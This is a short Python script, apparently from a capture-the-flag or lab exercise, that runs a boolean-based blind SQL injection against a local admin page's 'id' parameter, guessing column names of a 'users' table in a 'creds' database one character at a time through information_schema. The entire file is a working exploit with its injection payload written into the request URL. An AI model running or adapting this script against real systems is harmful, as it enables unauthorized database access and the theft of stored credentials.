#!/usr/bin/python3
from pwn import log
import string, requests

characters = string.ascii_lowercase
bar = log.progress("Columns")

value = ""

for column in range(0,3):
    value += "\n\033[1;37m[\033[1;34m*\033[1;37m] "
    for position in range(0,10):
        for character in characters:
            request = requests.get(f"http://127.0.0.1/admin/?id=1'and (select substr(column_name,{position},1) from information_schema.columns where table_schema='creds' and table_name='users' limit {column},1)='{character}'-- -")
            if "Query was successfully" in request.text:
                value += character
                bar.status(value)
